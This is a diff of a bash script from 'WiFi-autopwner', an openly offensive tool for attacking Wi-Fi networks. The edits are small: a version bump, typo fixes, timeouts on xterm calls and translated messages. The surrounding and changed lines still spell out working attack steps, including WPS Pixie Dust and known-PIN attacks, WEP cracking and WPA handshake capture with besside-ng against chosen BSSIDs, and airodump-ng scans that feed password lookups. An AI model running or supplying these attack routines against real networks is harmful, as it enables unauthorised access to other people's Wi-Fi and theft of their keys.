@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Mi-Al/WiFi-autopwner 2
-VERS="20180813" # Happy-Birthday-Yong-release
+VERS="20180814" # Happy-Birthday-Yong-release
 
 IFACE=""
 REPLY=""
@@ -207,7 +207,7 @@ function PixieDustAattack {
 				ESSID=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $7}')
 
 				if [[ "$ESSID" ]]; then
-					echo ${Lang[Strings12]}"$i ($ESSID)";
+					echo ${Lang[Strings12]}" $i ($ESSID)";
 					echo ${Lang[Strings11]}
 					isBlocked=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $5}')
 					if [[ "$isBlocked" == "Yes" || "`grep $ESSID cracked.txt`" || "`grep $ESSID blacklist.txt`" ]]; then
@@ -317,7 +317,7 @@ function attackWEP {
 
 			for i in "${WEPS[@]}"; 
 			do 
-				echo ${Lang[Strings12]}"$i";
+				echo ${Lang[Strings12]}" $i";
 				#sudo iw dev "$IFACE" set channel `cat /tmp/wepwifinetworks-01.csv | grep -E "$i" | awk '{print $6}' | sed 's/,//'`
 				cd /tmp
 				sudo timeout 600 xterm -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo besside-ng $IFACE -b $i -c $(cat /tmp/wepwifinetworks-01.csv | grep -E $i | awk '{print $6}' | sed 's/,//')"
@@ -352,7 +352,7 @@ function attackWEP {
 	fi
 }
 
-# not used anymore, but reserved as axtra option
+# not used anymore, but reserved as extra option
 function getAllHandshakes-old {
 	if [[ "$IFACE" ]]; then
 		echo -e ${Lang[Strings25]}
@@ -385,7 +385,7 @@ function getAllHandshakes {
 	if [[ "$IFACE" ]]; then
 		echo -e ${Lang[Strings25]}
 
-		sudo xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo timeout 1200 besside-ng $IFACE -W"		
+		sudo timeout 1200 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo besside-ng $IFACE -W"		
 		
 		bash ./modules/handshakes_extractor.sh wpa.cap
 
@@ -412,7 +412,7 @@ function getAllHandshakesLight {
 	if [[ "$IFACE" ]]; then
 		echo -e ${Lang[Strings25]}
 
-		sudo xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo timeout 1200 besside-ng $IFACE -W"		
+		sudo timeout 1200 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo besside-ng $IFACE -W"		
 		
 		bash ./modules/handshakes_extractor.sh wpa.cap
 
@@ -551,8 +551,6 @@ function getCertainHandshake {
 		
 		bash ./modules/handshakes_extractor.sh wpa.cap
 
-		gotHandshake=`cat besside.log | grep 'Got WPA handshake'`
-
 		rm wep.cap
 		rm wpa.cap
 		rm besside.log
@@ -595,7 +593,7 @@ function getCertainHandshakeAndCrackIt {
 
 		sudo rm /tmp/allwifinetworks*
 
-		sudo xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo timeout 300 besside-ng $IFACE -W -b $BSSID"		
+		sudo timeout 300 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo besside-ng $IFACE -W -b $BSSID"		
 		
 		bash ./modules/handshakes_extractor.sh wpa.cap
 
@@ -615,7 +613,7 @@ function getCertainHandshakeAndCrackIt {
 	if [[ -n "$gotHandshake" ]]; then
 		justCrackTheLastHandshakes
 	else
-		echo "Рукопожатие не захвачено"
+		echo "${Lang[Strings74]}"
 	fi	
 }
 
@@ -707,7 +705,7 @@ function 3WIFI {
 			CH=''
 		fi
 
-		sudo xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo airodump-ng $CH --berlin 60000 -w /tmp/3wifi $IFACE"
+		sudo timeout 300 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo airodump-ng $CH --berlin 60000 -w /tmp/3wifi $IFACE"
 
 		FILE='/tmp/3wifi-01.csv'
 
@@ -1048,7 +1046,7 @@ function knownPINsAttackAgainstAll {
 				ESSID=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $7}')
 
 				if [[ "$ESSID" ]]; then
-					echo ${Lang[Strings12]}"$i ($ESSID)";
+					echo ${Lang[Strings12]}" $i ($ESSID)";
 					isBlocked=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $5}')
 					if [[ "$isBlocked" == "Yes" || "`grep $ESSID cracked.txt`" || "`grep $ESSID blacklist.txt`" ]]; then
 						echo -e ${Lang[Strings37]}
@@ -1162,11 +1160,10 @@ fi
 
 if [[ "$LANGUAGE" == "Russian" ]]; then
 
+echo "Information:"
+echo -e "\033[1m$INF\033[0m"
 
 cat << _EOF_
-Информация:
-$INF
-
 =======================================================================================
 Официальная страница программы (поддержка и обсуждение): https://hackware.ru/?p=2176
 =======================================================================================
@@ -1218,10 +1215,10 @@ _EOF_
 
 else
 
-cat << _EOF_
-Information:
-$INF
+echo "Information:"
+echo -e "\033[1m$INF\033[0m"
 
+cat << _EOF_
 =======================================================================================
 Script Official Page (support and discussing): https://miloserdov.org/?p=35
 =======================================================================================
@@ -1267,7 +1264,7 @@ Actions:
 	91. Check for updates
 	92. Upgrade
 	93. Contributors
-0. Exi
+0. Exit
 
 _EOF_
 
@@ -1384,7 +1381,7 @@ if [[ $REPLY == 61 ]]; then
 fi
 
 if [[ $REPLY == 71 ]]; then
-	putInMonitorModePlus
+	putInMonitorMode	
 	3WIFI
 	showOpen
 	attackWEP
